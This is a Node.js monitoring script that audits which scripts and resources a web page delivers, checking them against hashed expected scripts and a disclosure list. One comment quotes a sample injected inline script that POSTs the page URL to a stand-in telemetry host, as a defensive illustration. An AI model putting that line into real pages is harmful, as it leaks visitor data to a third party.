#!/usr/bin/env node
/**
 * served-page-audit — what a page actually carries, as a browser receives it.
 *
 * STANDALONE. No repository, no checkout, no npm install, no dependencies. One file and
 * a Node with global fetch (18+). Copy it to wherever the schedule runs.
 *
 *   node served-page-audit.mjs
 *   node served-page-audit.mjs https://observerprotocol.org/check
 *   node served-page-audit.mjs https://observerprotocol.org/check --disclose=cloudflareinsights
 *   node served-page-audit.mjs --version
 *
 * THIS FILE IS NOT SERVED, AND THAT IS A RULING RATHER THAN AN OVERSIGHT.
 * `netlify.toml` 404s `/scripts/*`. The scheduler holds its own copy and does not fetch
 * it from the zone under test, because a monitor that downloads itself from the thing it
 * is monitoring cannot report that the thing is compromised.
 *
 * SO THE COPIES CAN DRIFT, AND THE HEADER BELOW IS HOW YOU FIND OUT.
 * `--version` prints the recorded version, the hash recorded in this file, and the hash
 * computed from the file on disk. Compare the COMPUTED hash against the repository's
 * recorded one. Three outcomes, all distinguishable:
 *
 *   recorded == computed, and matches the repo   this copy is the repo copy
 *   recorded != computed                         this copy was edited, header not updated
 *   both agree but differ from the repo          this copy is a different version
 *
 * WHAT THIS ADJUDICATES, AND THE LIMIT THAT COMES WITH IT
 * ------------------------------------------------------
 * It reads MARKUP. It does not execute anything.
 *
 * So it establishes what was DELIVERED, not what is PERFORMED. It sees a script that is
 * present, whether external or inline, and it cannot see what any of them does once it
 * runs. A runtime request made by a script that is already disclosed is out of its reach:
 * disclose a tag manager and it will not tell you which third parties that tag manager
 * then loads. That limit is stated on the page this watches, in the register, and here,
 * because a control's scope silently defining the defect is how the previous version of
 * this file was wrong.
 *
 * ONE CLIENT, ONE ORIGIN, ONE MOMENT. The same limit on a second axis, and it is the one
 * an operator is most likely to over-read. Edge configuration can vary what is delivered
 * by where the request came from, by user agent, and from one request to the next. Until
 * 2026-08-17 the beacon on this zone was set to be added for some visitors and not others,
 * decided at the edge by request origin, so a run from one place could have come back
 * clean while a reader somewhere else was receiving it, with neither observation wrong
 * about itself. A run of this file is evidence about that run. It is not coverage, and
 * scheduling it from a single host does not make it coverage.
 *
 * MEASURED 2026-08-17, and it is why inline is adjudicated at all: version 1.0.0 of this
 * file matched only `src=`, `href=`, `@import` and `url(`. An inline script injected into
 * the page, with no src, issuing `fetch('https://telemetry.example.com/collect', {method:
 * 'POST', body: location.href})` on load, scored exit 0 and printed "loads (nothing)".
 * The check was exactly accurate about the comparison it made and its accuracy is what
 * stopped anyone asking about the one it did not.
 *
 * WHY THE HEADERS
 * ---------------
 * Measured 2026-08-17 on observerprotocol.org: Cloudflare injects its Web Analytics
 * beacon into HTML responses ONLY when the request carries browser headers. A plain
 * `curl` of the same URL comes back with no beacon at all. Fetching the thing is not
 * enough; it has to be fetched as the reader.
 *
 * SYMMETRIC IN BOTH DIRECTIONS, TWICE OVER
 * ----------------------------------------
 * EXPECTED is the page's own script set, asserted positively. DISCLOSED is what the page
 * tells a visitor it carries in addition. The run fails when:
 *
 *   something is present that is neither expected nor disclosed   an injection
 *   something disclosed is no longer present                      a stale disclosure
 *   something expected is missing or altered                      the page's own code changed
 *
 * The third is the direction a subtraction hides in. An injected script is loud; the
 * page's own verifier being removed, or rewritten by a script-rewriting optimiser, leaves
 * a page that looks fine and checks nothing.
 *
 * ABSENCE IS A STATE WITH TWO CAUSES, AND THEY MUST NOT BE COLLAPSED
 * ------------------------------------------------------------------
 * A disclosed thing that is not in the response might have been removed at the zone, or
 * the edge might have transiently stopped injecting it. One observation cannot tell those
 * apart, and the difference is the whole question: the first means the toggle was flipped,
 * the second means nothing at all.
 *
 * So absence is not reported as established until a second observation, at least
 * --corroborate-after minutes later, sees it absent too. `--observations <path>` is where
 * that first sighting is written down. With no such path, absence can never be
 * corroborated and this exits 3 every time, which is the honest default: a single run
 * cannot corroborate itself.
 *
 * THE OBSERVATIONS FILE IS A LOCAL TIMER. IT IS NOT EVIDENCE.
 * This program writes the sighting that this program later reads. Nothing signs it,
 * nothing else witnesses it, and anyone holding the file can edit it, so it establishes
 * nothing to a third party and must never be cited as if it did. It is a way of
 * remembering how long ago something was first noticed, and that is its entire job.
 *
 * What sixty minutes buys is correspondingly narrow: it RULES OUT A TRANSIENT. It rules
 * out nothing else. It does not establish that a setting was changed, who changed it,
 * when, or that it will stay changed. The authority for that is the operator stating the
 * toggle was flipped, plus the CDN's incident being resolved. Corroboration is a filter
 * on noise, not a source of authority, and this file is not the record of anything.
 *
 * THIS GATES A DECISION, and the decision is stated here so the code and the rule cannot
 * drift apart. /check's strong sentence goes back to its full form only when ALL THREE of
 * these hold, not on a clean run alone:
 *
 *   1. the operator states the toggle was flipped
 *   2. two runs of this file, at least 60 minutes apart, both come back with the beacon
 *      absent and corroborated
 *   3. the CDN's own status page shows the dashboard incident resolved
 *
 * Condition 3 is not ceremony. While the dashboard is in an incident the toggle cannot be
 * flipped, so an absence observed during one is evidence of the incident and not of the
 * setting.
 *
 * EXIT CODES, because this is meant to be scheduled
 *   0  what the page carries is exactly what is expected and disclosed
 *   1  mismatch, established. Something undisclosed is present, something expected is
 *      missing, or something disclosed is absent AND corroborated.
 *   2  could not reach the page. NOT a pass. A check that cannot reach its subject must
 *      say it did not look, and a scheduler must tell that apart from a clean result.
 *   3  something disclosed is absent on a single observation. NOT a pass, and not the
 *      signal either. Same reasoning as 2 being separate from 1: a state nobody has
 *      established yet is its own answer.
 */

import { readFileSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';

const AUDIT_VERSION = '3.3.1';
// sha256 of this file with the literal on the line below normalised to an empty string.
// Recompute with --version. Update it in the same commit as any edit to this file.
const AUDIT_SHA256 = '6e09e52f5b86efe56e3cf5cb363b98d69f6b49c5c4286228c9205a6c72b50400';

const sha256 = (s) => createHash('sha256').update(s).digest('hex');

function computeSelfHash() {
  const src = readFileSync(fileURLToPath(import.meta.url), 'utf8');
  return sha256(src.replace(/const AUDIT_SHA256 = '[a-f0-9]*';/, "const AUDIT_SHA256 = '';"));
}

// ─── the page's own scripts, asserted positively ──────────────────────────────────
//
// Hash of the script body exactly as served. Update alongside check.html; the repository
// keeps these honest with scripts/check-audit-expectations.mjs, which recomputes them
// from the file and fails the build when they drift.
const EXPECTED = [
  {
    label: 'the embedded published example',
    sha256: 'a2524ac4c965bfb3388a9bc05a636e51b321063ef65b98ed567e73145758ca24',
    why: 'The worked example, carried in the page so that loading it costs no request. Its absence would send the example over the network; its alteration would show a visitor an artifact that is not the published one.',
  },
  {
    label: 'the embedded refusal example',
    sha256: 'a37510d6a853f3c369bf8f23f22d98f66541b50986343366e727c1d977fcc7f8',
    why: 'The refusal record the page hands a visitor who arrives without one. Its absence would leave the refusal route with no worked example; its alteration would hand a visitor a record that is not the one this repository checks on every build.',
  },
  {
    label: 'the page verifier',
    sha256: '7f10a0631d5c6baccd7054b3abe1309d483973d14c26424a2562ece4bde7adcc',
    why: 'The code that reaches the verdict. If this is missing the page renders and decides nothing; if it is altered, it decides something else.',
  },
];

const args = process.argv.slice(2);

if (args.includes('--version') || args.includes('-v')) {
  const computed = computeSelfHash();
  const agree = computed === AUDIT_SHA256;
  console.log(`version   ${AUDIT_VERSION}`);
  console.log(`recorded  ${AUDIT_SHA256}`);
  console.log(`computed  ${computed}`);
  console.log('');
  console.log(
    agree
      ? 'This copy matches its own header. Compare the computed hash against the repository copy.'
      : 'MISMATCH. This copy was edited and its header was not updated, so it is not the file it says it is.'
  );
  process.exit(agree ? 0 : 1);
}

const url = args.find((a) => !a.startsWith('-')) ?? 'https://observerprotocol.org/check';
const disclosed = args
  .filter((a) => a.startsWith('--disclose='))
  .flatMap((a) => a.slice('--disclose='.length).split(','))
  .map((s) => s.trim())
  .filter(Boolean);

// Where a first sighting of an absence is written down, so a later run can corroborate it.
// Absent by default, and the default is the strict one: with nowhere to write, absence is
// never corroborated and this exits 3 every time.
const observationsPath = args.find((a) => a.startsWith('--observations='))?.slice('--observations='.length);
const corroborateAfterMin = Number(args.find((a) => a.startsWith('--corroborate-after='))?.slice('--corroborate-after='.length) ?? 60);

const readObservations = () => {
  if (!observationsPath) return {};
  try { return JSON.parse(readFileSync(observationsPath, 'utf8')); } catch { return {}; }
};
const writeObservations = (o) => {
  if (!observationsPath) return;
  try { writeFileSync(observationsPath, JSON.stringify(o, null, 2) + '\n'); }
  catch (e) { console.log(`(could not write ${observationsPath}: ${e.message}. Absence cannot be corroborated without it.)`); }
};

const BROWSER_HEADERS = {
  'User-Agent':
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
  Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
};

let body, headers;
try {
  const res = await fetch(url, { headers: BROWSER_HEADERS, redirect: 'follow' });
  headers = res.headers;
  if (!res.ok) {
    console.log(`NOT CHECKED  ${url} returned HTTP ${res.status}.`);
    console.log('             Reported rather than passed. This is not a clean result.');
    process.exit(2);
  }
  body = await res.text();
} catch (e) {
  console.log(`NOT CHECKED  ${url} could not be fetched: ${e.message}`);
  console.log('             Reported rather than passed. This is not a clean result.');
  process.exit(2);
}

// ─── every script element, external or not ────────────────────────────────────────
const scripts = [];
for (const m of body.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/gi)) {
  const attrs = m[1] ?? '';
  const src = attrs.match(/\bsrc\s*=\s*["']?([^"'\s>]+)/i);
  scripts.push(src ? { kind: 'script', ref: src[1] } : { kind: 'inline', body: m[2], hash: sha256(m[2]) });
}

// ─── every other resource the markup pulls ────────────────────────────────────────
//
// Scanned with the page's own JSON islands removed: a URL inside data a page DISPLAYS is
// text a reader can see, not a resource a browser goes and gets. The islands are still
// inventoried above as scripts, so removing one is still caught.
const withoutIslands = body.replace(/<script[^>]*type=["']application\/json["'][\s\S]*?<\/script>/gi, '');
const OTHER_LOADS = [
  [/<link[^>]*\bhref\s*=\s*["']?([^"'\s>]+)/gi, 'link'],
  [/<iframe[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)/gi, 'iframe'],
  [/<img[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)/gi, 'image'],
  [/<embed[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)/gi, 'embed'],
  [/<object[^>]*\bdata\s*=\s*["']?([^"'\s>]+)/gi, 'object'],
  [/@import\s+["']?([^"'\s;]+)/gi, 'css-import'],
  [/url\(\s*["']?(https?:\/\/[^"')\s]+)/gi, 'css-url'],
];
for (const [re, kind] of OTHER_LOADS) {
  for (const m of withoutIslands.matchAll(re)) {
    if (m[1] && !scripts.some((s) => s.ref === m[1])) scripts.push({ kind, ref: m[1] });
  }
}

// ─── adjudication ─────────────────────────────────────────────────────────────────
const expectedByHash = new Map(EXPECTED.map((e) => [e.sha256, e]));
const isDisclosed = (item) =>
  disclosed.some((d) =>
    item.ref !== undefined ? item.ref.includes(d) : item.body.includes(d) || item.hash.startsWith(d)
  );

const rows = [];
const problems = { undisclosed: [], missingDisclosure: [], missingExpected: [] };

for (const item of scripts) {
  if (item.kind === 'inline') {
    const expected = expectedByHash.get(item.hash);
    if (expected) { rows.push(['ok', 'own', `${expected.label}  ${item.hash.slice(0, 16)}`]); continue; }
    if (isDisclosed(item)) { rows.push(['ok', 'inline', `disclosed  ${item.hash.slice(0, 16)}`]); continue; }
    rows.push(['FAIL', 'inline', `${item.hash.slice(0, 16)}  ${item.body.trim().replace(/\s+/g, ' ').slice(0, 90)}`]);
    problems.undisclosed.push(`an inline script, sha256 ${item.hash}`);
    continue;
  }
  if (isDisclosed(item)) { rows.push(['ok', item.kind, item.ref]); continue; }
  rows.push(['FAIL', item.kind, item.ref]);
  problems.undisclosed.push(`${item.kind} ${item.ref}`);
}

for (const e of EXPECTED) {
  if (!scripts.some((s) => s.hash === e.sha256)) {
    rows.push(['FAIL', 'missing', `${e.label}  expected sha256 ${e.sha256.slice(0, 16)}`]);
    problems.missingExpected.push(e);
  }
}

// ─── absence, and whether anyone has established it ───────────────────────────────
//
// Three answers, not two. `served` is one observation and needs no second, because
// presence has one cause. Absence has two, so it gets a state of its own until a run
// separated in time sees the same thing.
const observations = readObservations();
const now = Date.now();
const uncorroborated = [];

for (const d of disclosed) {
  const stillThere = scripts.some((s) => (s.ref !== undefined ? s.ref.includes(d) : s.body.includes(d) || s.hash.startsWith(d)));
  if (stillThere) {
    if (observations[d]) { delete observations[d]; }   // present again: the clock restarts
    continue;
  }
  const first = observations[d]?.firstAbsentAt;
  if (first === undefined) {
    observations[d] = { firstAbsentAt: new Date(now).toISOString(), url };
    rows.push(['....', 'absent', `${d}  absent, first observation, nothing established yet`]);
    uncorroborated.push({ token: d, minutes: 0 });
    continue;
  }
  const minutes = Math.floor((now - Date.parse(first)) / 60000);
  if (minutes < corroborateAfterMin) {
    rows.push(['....', 'absent', `${d}  absent, ${minutes} min since first sighting, ${corroborateAfterMin} needed`]);
    uncorroborated.push({ token: d, minutes });
    continue;
  }
  rows.push(['FAIL', 'stale', `${d}  absent and corroborated, ${minutes} min apart`]);
  problems.missingDisclosure.push(d);
}
writeObservations(observations);

// ─── report ───────────────────────────────────────────────────────────────────────
console.log(`url          ${url}`);
console.log(`audit        ${AUDIT_VERSION}  ${AUDIT_SHA256.slice(0, 16)}`);
console.log(`server       ${headers.get('server') ?? '(none)'}`);
console.log(`cf-ray       ${headers.get('cf-ray') ?? '(none)'}`);
console.log(`disclosed    ${disclosed.length ? disclosed.join(', ') : '(nothing beyond the page itself)'}`);
console.log('');
for (const [status, kind, detail] of rows) console.log(`${status.padEnd(8)} ${kind.padEnd(10)} ${detail}`);
if (!rows.length) console.log('(the page carries no scripts and no other resources at all)');

const failed = problems.undisclosed.length + problems.missingDisclosure.length + problems.missingExpected.length;
if (failed) {
  console.log('');
  if (problems.undisclosed.length) {
    console.log('This page carries something neither expected nor disclosed.');
    console.log('  Either it goes, or the page discloses it AND it is added to --disclose, together.');
  }
  if (problems.missingExpected.length) {
    console.log("This page is missing one of its own scripts, or one of them has been altered.");
    for (const e of problems.missingExpected) console.log(`  ${e.label}: ${e.why}`);
    console.log('  A subtraction is quieter than an injection and this is the direction it hides in.');
  }
  if (problems.missingDisclosure.length) {
    console.log('This page discloses something it no longer carries.');
    console.log('  The good direction, and still a failure: the page now describes something that');
    console.log('  is not there. Remove the disclosure and the --disclose entry together.');
  }
  console.log('');
  console.log('Read this as what was DELIVERED. Nothing here was executed, so a runtime request');
  console.log('made by a script listed above is outside what this establishes.');
  process.exit(1);
}

if (uncorroborated.length) {
  console.log('');
  console.log('Something disclosed is absent, and one observation does not establish that.');
  for (const u of uncorroborated) {
    console.log(`  ${u.token}: absent, ${u.minutes} min since first sighting.`);
  }
  console.log('');
  console.log('  Absence has two causes and this cannot tell them apart: removed at the zone,');
  console.log('  or the edge transiently not injecting. Run again at least');
  console.log(`  ${corroborateAfterMin} minutes from the first sighting.`);
  if (!observationsPath) {
    console.log('');
    console.log('  No --observations path was given, so nothing was written down and this can');
    console.log('  never corroborate. That is the default on purpose: a single run cannot');
    console.log('  corroborate itself. Pass --observations=<path> to let a later run do it.');
  }
  console.log('');
  console.log('  THIS IS NOT A PASS. It is also not the signal. Exit 3.');
  process.exit(3);
}

console.log('');
console.log('What a visitor receives is exactly the page, plus exactly what is disclosed.');
console.log('Markup only: nothing was executed, so this is what was delivered, not what is performed.');
